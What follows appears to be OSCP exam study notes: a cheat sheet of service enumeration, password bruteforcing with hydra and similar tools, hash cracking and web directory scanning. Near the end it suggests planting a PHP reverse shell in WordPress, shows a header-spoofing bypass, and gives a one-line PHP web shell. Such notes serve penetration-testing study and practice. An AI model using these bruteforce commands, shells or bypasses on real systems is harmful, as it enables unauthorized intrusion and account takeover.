# OSCP Notes

# **Enumeration Commands**

## **Ping IP and Check TTL**

- **`nmap -p- ip -T5 --open`**
- **`nmap -p(ports here) -sC -sV ip -o nmap`** (add **`sU`** to scan UDP ports if unsatisfied with output)

## **Script Scan**

- **`nmap -sV --script=vulscan/vulscan.nse`**

## **Port Specific NSE Scripts**

- **`ls /usr/share/nmap/scripts/ssh*`**
- **`ls /usr/share/nmap/scripts/smb*`**

## **FTP**

- Anonymous login: user and pass = **`anonymous`**File Upload command: **`put shell.php`**

## **TELNET**

- Check if telnet is enabled or try: **`telnet ip 21`** (21 is the port)
- **`site cpfr path`** (works only if path and file are valid)
- **`site cpto path`**

## **SSH**

- **`id_rsa.pub`**: Public key used in authorized keys dir for login
- **`id_rsa`**: Private key for direct login or bruteforce using **`ssh2john`** and crack with **`john`** or **`hashcat`**
- **`ssh -i id_rsa user@ip`**
- Passwordless login: add **`id_rsa.pub`** to authorized keys directory**`o StrictHostKeyChecking=no`** to avoid host key errors

## **MYSQL**

- **`nmap -sV -Pn -vv 10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysqlinfo,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122`**

## **SMB (139 & 445)**

- **`nmap --script smb-protocols ip`**
- **`ls -l /usr/share/nmap/scripts/smb*`** (list all SMB scripts)
- **`net view \\dc01 /all`** (Windows)

### **Enumerating SMB Shares**

- **`crackmapexec smb ip`**
- **`crackmapexec smb ip --shares`**
- **`crackmapexec smb ip -u '' -p ''`**
- **`enum4linux -a ip`** (Look for shares, find password from clues)
- **`smbmap -H ip`**
- **`smbmap -H ip -u 'user' -p 'pass'`**
- **`smbmap -H ip -u '' -p ''`**
- **`smbmap -H ip -u ''`**
- **`smbmap -H ip -s share_name`**
- **`smbclient -L //ip`**
- **`smbclient -L //ip/`**
- **`smbclient //ip/sharename`**
- **`smbclient -L //ip -N`** (No password, SMB Null session)
- **`smbclient --no-pass -L ip`** (no pass)
- **`smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234`**(Use **`U`** to access specific user shares)Recurse on - toggles recursionPrompt off - doesn't prompt to download (y/n)

# **File Operations in SMB**

- **`mget *`** (downloads all files)
- **`gpp-decrypt "hash"`**

# **Easy Way to Download All Files in SMB Server**

- Recurse ON
- Prompt OFF
- **`mget *`**

# **RPC (Remote Procedure Call)**

- **`rpcclient -U "" 10.10.10.10`**
- **`rpcclient -U '' 10.10.10.10`**

### **RPC Commands**

- **`enumdomusers`**
- **`enumdomgroups`**
- **`enumprivs`**
- **`queryuser [rid]`**
- **`getdompwinfo`**
- **`getusrdompwinfo [rid]`**

### User Enumeration Commands

- **`queryusergroups rid`**
- **`querygroup rid`**

# **SNMP (Simple Network Management Protocol)**

- **`community.txt`** (public, private, manager)
- **`onesixtyone -c community -i ips`**
- **`snmpwalk -c public -v1 -t 10 192.168.148.151`** (To enumerate MIB Tree)

### **SNMP MIB Tree Enumeration**

- **`1.3.6.1.2.1.25.1.6.0`** System Processes
- **`1.3.6.1.2.1.25.4.2.1.2`** Running Programs
- **`1.3.6.1.2.1.25.4.2.1.4`** Processes Path
- **`1.3.6.1.2.1.25.2.3.1.4`** Storage Units
- **`1.3.6.1.2.1.25.6.3.1.2`** Software Name
- **`1.3.6.1.4.1.77.1.2.25`** User Accounts
- **`1.3.6.1.2.1.6.13.1.3`** TCP Local Ports

### **Additional SNMP Commands**

- **`snmpwalk -c public -v 1 192.168.225.149 NET-SNMP-EXTEND-MIB::nsExtendObjects`**
- **`snmpwalk -c public -v 1 192.168.225.149 hrSWRunParameters`**
- **`snmp-check 192.168.120.94`**

# **NFS (Network File System)**

- **`showmount -e 10.1.1.27`**
- **`mkdir /mount/nfs`**
- **`mount -t nfs ip:/pathshown /mnt/nfs`**
- Permission Denied? [Refer Blog](https://blog.christophetd.fr/write-up-vulnix/)

# **POP3**

- **`nc ip port`**
- **`USER "username"`**
- **`PASS "password"`**
- **`LIST`**
- **`RETR 1`**
- **`RETR 2`**

# **SMTP**

- **`nc ip port`**
- **`VRFY root`**
- **`VRFY user`**
- **`Test-NetConnection -Port 25 192.168.50.8`** (Windows)

# **Exploiting Port 3389 (RDP - Remote Desktop Protocol)**

- [Exploit 1](https://www.exploit-db.com/exploits/47519)
- [Exploit 2](https://github.com/whokilleddb/CVE-2019-17662)

# **Bruteforce and Hash Cracking**

## **CEWL (Custom Word List Generator)**

- **`cewl -d 2 -m 5 -w docswords.txt url`**
    - **`d`**: depth
    - **`m`**: minimum word length
    - **`w`**: output file
    - **`-lowercase`**: lowercase all parsed words (optional)

## **Hashcat**

- [Hashcat Example Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [HashID Types](https://mattw.io/hashID/types) (HashID match)
- **`hashcat -m "number" hash.txt rockyou.txt`**

## **John the Ripper**

- **`john hash.txt --wordlist=~/rockyou.txt`**

## **Online Tools**

- [CrackStation](https://crackstation.net/)
    - Supports LM, NTLM, md2, md4, md5, md5(md5_hex), md5-half, sha1, sha224, sha256, sha384, sha512, ripeMD160, whirlpool, MySQL 4.1+ (sha1(sha1_bin)), QubesV3.1BackupDefaults
- [dCode](https://www.dcode.fr/tools-list)
    - Supports MD4, MD5, RC4 Cipher, RSA Cipher, SHA-1, SHA-256, SHA-512, XOR Cipher
- [MD5 Decrypt](https://www.md5online.org/md5-decrypt.html)
- [MD5 Online](https://md5.gromweb.com/)

## **Protocol Bruteforce**

### **Hydra**

- Supports TELNET, FTP, HTTP, HTTPS, HTTP-PROXY, SMB, SMBNT, MS-SQL, MYSQL, REXEC, irc, RSH, RLOGIN, CVS, SNMP, SMTP, SOCKS5, VNC, POP3, IMAP, NNTP, PCNFS, XMPP, ICQ, SAP/R3, LDAP2, LDAP3, Postgres, Teamspeak, Cisco auth, Cisco enable, AFP, Subversion/SVN, Firebird, LDAP2, Cisco AAA
- **`hydra -L users.txt -P pass.txt 192.168.0.114 ssh`** (use **`l`** if you know the username)

### **Medusa**

- Supports AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NetWare NCP, NNTP, PcAnywhere, POP3, PostgreSQL, REXEC, RLOGIN, RSH, SMBNT, SMTP-AUTH, SMTP-VRFY, SNMP, SSHv2, Subversion (SVN), Telnet, VMware Authentication Daemon (vmauthd), VNC, Generic Wrapper, Web Form
- **`medusa -u qiu -P rockyou.txt -T 5 192.168.0.116 -p smb`**

### **Ncrack**

- Fastest bruteforce tool
- Supports RDP, SSH, http(s), SMB, pop3(s), VNC, FTP, telnet
- SSH Example: **`ncrack -v -U user.txt -P pass.txt ssh://10.10.10.10:<port> -T5`**

## **Additional Hydra Examples**

- **`hydra -L users.txt -P rockyou.txt 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid Username or Password" -V -s 7654`** (identify exact parameters in the request)
- **`hydra -l admin -P ~/rockyou.txt -f 192.168.143.201 http-get /`** (Basic Auth)
- **`hydra -l kali -P usernames.txt ssh://ip`** (use **`l -p`** if you know username and password, else bruteforce using **`L -P`**)
- **`hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202`**

## **HTTP Form Post**

```bash
hydra 10.0.2.22 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -l x -P ~/rockyou.txt -t 10 -w 30
```

- Bruteforces a single parameter to gain access.

## **POP3 Bruteforce**

```bash
hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -f 192.168.1.10 -s 55007 pop3
```

- POP3 bruteforce with a valid username (**`natalya`**).

## **Telnet Bruteforce**

```bash
hydra -l james -P passwords.txt 10.2.2.23 telnet
```

- Telnet bruteforce with the username **`james`**.

## **MySQL Bruteforce**

```bash
hydra -l root -P ~/rockyou.txt sunset-midnight mysql -t 4
```

- MySQL bruteforce with the username **`root`**.

## HTTP Form Post Bruteforce:

```bash
hydra 10.0.2.22 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -l x -P ~/rockyou.txt -t 10 -w 30
```

- Bruteforces a single parameter to gain access.

## POP3 Bruteforce with Valid Username:

```bash
hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -f 192.168.1.10 -s 55007 pop3
```

- POP3 bruteforce with the valid username **`natalya`**.

## Telnet Bruteforce:

```bash
hydra -l james -P passwords.txt 10.2.2.23 telnet
```

- Telnet bruteforce with the username **`james`**.

## MySQL Bruteforce:

```bash
hydra -l root -P ~/rockyou.txt sunset-midnight mysql -t 4
```

- MySQL bruteforce with the username **`root`**.

# **Directory Enumeration for Ports 80 and 443**

## **dirsearch**

```bash
dirsearch -u url
```

## **ffuf**

```bash
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u url -mc -e txt,php,csv,md,json,js,html,py,sh -fs 80
```

## **gobuster**

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -u http://
gobuster dir -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 100 -x txt,php,csv,md,json,js,html,py,sh,pdf,config -u url
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,csv,md,json,js,html,py,sh,pdf,config -t 100 -u url
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 100 -x txt,php,csv,md,json,js,html,py,sh,pdf -u url -k
```

**Note:** For ffuf, use **`-H "Authorization: Basic YWRtaW46YWRtaW4="`** for header if needed.

# **WordPress Enumeration**

## **wpscan**

```bash
wpscan --url http://10.10.10.10 -e u,vp # enumerate users & vulnerable plugins
wpscan --url 10.10.10 --passwords rockyou.txt --usernames elliot
```

# **Username Enumeration via BruteForce**

- [WordPress Brute Force Script](https://github.com/SecurityCompass/wordpress-scripts/blob/master/wp_login_user_enumeration.py)

```bash
python wp_brute.py url -t
```

**Note:** Try to create **`shell.php`** with PHP reverse shell payload in themes or plugins and try to open it with listening **`nc`** in Kali (Need write permission). Use **`php-reverse-shell.php`** or generate it with **`msfvenom`**.

# **To Analyze the Response of Request**

```bash
curl http://ip
```

# **WAF Bypass**

```bash
curl http://192.168.120.149:13337/logs -H "X-Forwarded-For: localhost"
```

# **Username Registration**

```php
<?php system($_POST["cmd"]);?>
```

This script allows running arbitrary commands via a POST request.